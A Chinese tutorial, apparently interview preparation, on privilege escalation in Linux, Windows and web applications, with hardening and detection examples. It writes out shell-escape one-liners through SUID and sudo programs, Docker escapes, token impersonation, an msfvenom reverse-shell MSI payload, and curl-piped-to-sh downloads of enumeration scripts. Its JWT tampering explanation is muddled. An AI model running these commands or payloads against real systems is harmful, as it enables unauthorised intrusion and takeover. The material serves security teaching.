# 权限提升：从小兵到管理员

攻击者通过漏洞拿到了一个普通用户账号。

普通用户能做的不多——浏览文件、执行有限命令、访问受限资源。

但如果攻击者能进一步获得管理员或 root 权限……

**权限提升（Privilege Escalation）** 就是这个过程。

## 权限提升的类型

### 1. 水平越权（Horizontal Escalation）

获取同级别用户的资源：

```
攻击者（用户A） → 用户B的资源
- 银行应用：访问其他用户的账户
- 医疗系统：查看其他患者的记录
```

### 2. 垂直越权（Vertical Escalation）

获取更高权限级别的资源：

```
普通用户 → 管理员
- Linux：user → root
- Windows：User → Administrator
- Web 应用：普通用户 → 管理员后台
```

## Linux 权限提升

### 1. SUID/SGID 提权

```bash
# 查找具有 SUID 权限的程序
find / -perm -4000 -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null

# 检查不常见的 SUID 程序
ls -la /usr/bin/passwd  # passwd 需要 root 权限修改 /etc/passwd
-rwsr-xr-x 1 root root ... /usr/bin/passwd

# GTFOBins - SUID 提权手册
# https://gtfobins.github.io/
```

### 2. 滥用 SUID 程序

```bash
# 例子：使用 vim 提权
# vim 有 SUID 权限，可以编辑任意文件
sudo vim -c ':!/bin/sh'

# 例子：使用 find 提权
find . -exec /bin/sh -p \; -quit

# 例子：使用 perl 提权
perl -e 'exec "/bin/sh";'

# 例子：使用 python 提权
python -c 'import os; os.system("/bin/sh")'
```

### 3. sudo 滥用

```bash
# 查看当前用户可以 sudo 执行的命令
sudo -l

# 示例输出：
# User user may run the following commands on this:
#     (ALL) /usr/bin/find
#     (ALL) /usr/bin/less
#     (ALL) /usr/bin/awk

# find 提权
sudo find . -exec /bin/sh -p \; -quit

# less 提权
sudo less /etc/passwd
# 在 less 中输入
!/bin/sh

# awk 提权
sudo awk 'BEGIN {system("/bin/sh")}'

# python 提权
sudo python -c 'import os; os.system("/bin/sh")'
```

### 4. 内核漏洞提权

```bash
# 查看内核版本
uname -a
cat /etc/issue

# 使用 searchsploit 查找漏洞
searchsploit linux kernel 5.4.0

# 使用 LinPEAS 自动检测
# https://github.com/carlospolop/PEASS-ng
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

### 5. Docker 容器逃逸

```bash
# 检查是否为 Docker 用户组
groups
groups username

# Docker 逃逸方法 1：挂载宿主机根目录
docker run -v /:/mnt --rm -it alpine chroot /mnt sh

# Docker 逃逸方法 2：特权容器
docker run --rm --privileged -v /:/host alpine chroot /host sh

# Docker 逃逸方法 3：docker.sock
ls -la /var/run/docker.sock
docker -H unix:///var/run/docker.sock run -v /:/host --rm -it alpine chroot /host sh
```

## Windows 权限提升

### 1. 服务配置错误

```powershell
# 检查不安全的服务权限
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv "Users" * /accepteula

# 检查可修改的服务
sc query
icacls "C:\path\to\service.exe"
```

### 2. AlwaysInstallElevated

```powershell
# 检查注册表
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer

# 如果启用，可安装 MSI 为 SYSTEM
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f msi > shell.msi
msiexec /quiet /qn /i shell.msi
```

### 3. DLL 劫持

```powershell
# 查找程序加载的 DLL
procmon /accepteula

# 检查可疑路径
# 1. 程序查找 DLL 的路径
# 2. 其中某些路径可写
# 3. 放置恶意 DLL

# 常见劫持位置
# C:\Windows\Temp
# C:\ProgramData
# 用户目录
```

### 4. Token 窃取

```powershell
# 使用 PowerSploit
Invoke-TokenManipulation -ShowAll
Invoke-TokenManipulation -ImpersonateUser -Username "NT AUTHORITY\SYSTEM"

# 或使用 meterpreter
use incognito
list_tokens -u
impersonate_token "NT AUTHORITY\SYSTEM"
```

### 5. 计划任务提权

```powershell
# 查看可写的计划任务
schtasks /query /fo LIST /v

# 或使用 PowerUp
Invoke-AllChecks
```

## Web 应用权限提升

### 1. IDOR + 垂直越权

```java
// 漏洞代码：只验证是否登录，没验证权限
@GetMapping("/api/admin/users")
public List<User> getAllUsers() {
    // 应该检查用户是否是管理员
    return userRepository.findAll();  // 任何登录用户都能访问
}

// 修复
@GetMapping("/api/admin/users")
public List<User> getAllUsers() {
    User currentUser = getCurrentUser();
    if (!currentUser.hasRole("ADMIN")) {
        throw new ForbiddenException();
    }
    return userRepository.findAll();
}
```

### 2. JWT 权限篡改

```java
// 漏洞代码：只验证签名，不验证权限
String token = request.getHeader("Authorization");
Claims claims = Jwts.parser()
    .verifyWith(key)
    .build()
    .parseSignedClaims(token)
    .getPayload();

// 攻击者修改 payload：
// {"sub":"user","role":"admin"}
// 重新签名

// 修复：验证权限
String role = claims.get("role", String.class);
if (!"admin".equals(role)) {
    throw new ForbiddenException();
}
```

### 3. 隐藏接口访问

```java
// 漏洞代码：接口存在但没保护
@RestController
public class HiddenAdminController {
    
    @PostMapping("/api/internal/reset-all-passwords")
    public Result resetAllPasswords() {
        // 这个接口存在但没有 @PreAuthorize
        // 任何知道 URL 的人都能调用
        return adminService.resetAllPasswords();
    }
}

// 修复
@PostMapping("/api/internal/reset-all-passwords")
@PreAuthorize("hasRole('SUPER_ADMIN')")
public Result resetAllPasswords() {
    return adminService.resetAllPasswords();
}
```

## 权限提升防御

### Linux 加固

```bash
# 1. 最小化 SUID
# 查找并移除不必要的 SUID
find / -perm -4000 -type f 2>/dev/null
chmod u-s /path/to/program  # 移除 SUID

# 2. sudo 配置
visudo
# 允许的命令最小化
username ALL=(ALL) /usr/bin/systemctl status nginx

# 3. 内核更新
apt update && apt upgrade linux-image

# 4. 容器安全
# 不要用特权容器
docker run --rm --privileged alpine

# 5. 审计日志
auditd 配置
auditctl -w /etc/passwd -p wa -k passwd_modify
```

### 应用安全

```java
// 权限验证注解
@Target({ElementType.METHOD, ElementType.TYPE})
@Retention(RetentionPolicy.RUNTIME)
public @interface RequirePermission {
    String[] value();
}

// 全局异常处理
@ExceptionHandler(AccessDeniedException.class)
public Result handleAccessDenied(AccessDeniedException e) {
    log.warn("Unauthorized access attempt: {}", e.getMessage());
    return Result.error(403, "没有权限执行此操作");
}

// 使用 Spring Security
@Configuration
@EnableWebSecurity
public class SecurityConfig {
    
    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http
            .authorizeHttpRequests(auth -> auth
                .requestMatchers("/api/admin/**").hasRole("ADMIN")
                .requestMatchers("/api/**").authenticated()
                .anyRequest().permitAll()
            );
        return http.build();
    }
}
```

### 监控与检测

```java
@Service
public class PrivilegeEscalationDetector {
    
    /**
     * 检测提权行为
     */
    public void detectEscalation(String user, String newGroup) {
        // 记录日志
        log.warn("Privilege escalation detected: user={}, newGroup={}", user, newGroup);
        
        // 发送告警
        alertService.sendAlert(Alert.builder()
            .type("PRIVILEGE_ESCALATION")
            .severity(Severity.HIGH)
            .message("User " + user + " gained " + newGroup + " privileges")
            .build());
    }
}
```

## 权限提升检测工具

```bash
# Linux 提权检测
# LinPEAS
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# LinEnum
curl -L https://github.com/rebootuser/LinEnum/archive/main.zip | unzip -p - LinEnum-main/LinEnum.sh | sh

# Windows 提权检测
# WinPEAS
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/winpeas.exe -o winpeas.exe
.\winpeas.exe

# PowerSploit
Import-Module .\PowerUp.ps1
Invoke-AllChecks
```

## 面试追问方向

1. **水平越权和垂直越权的区别？** —— 水平越权访问同级别资源，垂直越权获取更高权限
2. **SUID 提权的原理？** —— SUID 程序以文件所有者身份运行，可用于提权
3. **Docker 逃逸是什么？** —— 从容器内突破到宿主机
4. **如何防止 Web 应用的垂直越权？** —— 每个接口都要验证权限，不能只验证登录
5. **Token 窃取的原理？** —— 窃取其他用户的访问令牌，使用户身份被冒用

> "权限提升是攻击的最后一步，也是最关键的一步。理解它，才能真正设计出安全的系统。"
